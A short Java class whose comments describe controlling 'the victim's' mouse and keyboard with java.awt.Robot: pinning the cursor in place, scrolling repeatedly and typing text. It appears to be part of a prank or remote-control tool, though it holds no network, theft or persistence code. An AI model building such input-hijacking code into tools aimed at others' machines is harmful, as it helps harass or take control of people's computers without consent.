import java.awt.AWTException;
import java.awt.Point;
import java.awt.Robot;

/**
 * Class that contains methods that allow the programmer to control the mouse and keyboard of the victim.
 * Created by sam on 14/09/2017.
 */
public class MouseKeyboardControl {

    /**
     * Method that makes the mouse stay stuck on a certain point on the screen for a certain amount of seconds.
     * @param time amount of seconds
     * @param location location where the mouse will be stuck
     * @throws AWTException
     */
    public static void mouseStuck(int time, Point location) throws AWTException{
        Robot r = new Robot();

        long startTime = System.currentTimeMillis();

        while ((System.currentTimeMillis() - startTime) / 1000 < time) {
            r.mouseMove((int) location.getX(), (int) location.getY());
        }
    }

    /**
     * Method that makes the mouse scroll up and down for a certain amount of time with a certain delay between scrolls.
     * @param amount amount that needs to be scrolled
     * @param time time in seconds that the method needs to keep scrolling
     * @param delay delay between the up and down scrolls
     * @throws AWTException
     */
    public static void mouseScroll(int amount, int time, int delay) throws AWTException{
        Robot r = new Robot();

        long startTime = System.currentTimeMillis();

        while ((System.currentTimeMillis() - startTime) / 1000 < time) {
            try {
                r.mouseWheel(amount);
                Thread.sleep((long) (delay * 1000));
                r.mouseWheel(- amount);
                Thread.sleep((long) (delay * 1000));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Method that types a given string.
     * @param string text that needs to be typed
     * @throws AWTException
     */
    public static void typeString (String string) throws AWTException{
        Robot r = new Robot();

        char[] chars = string.toCharArray();

        for (int i = 0; i < chars.length; i++) {
            r.keyPress(chars[i]);
        }
    }
}
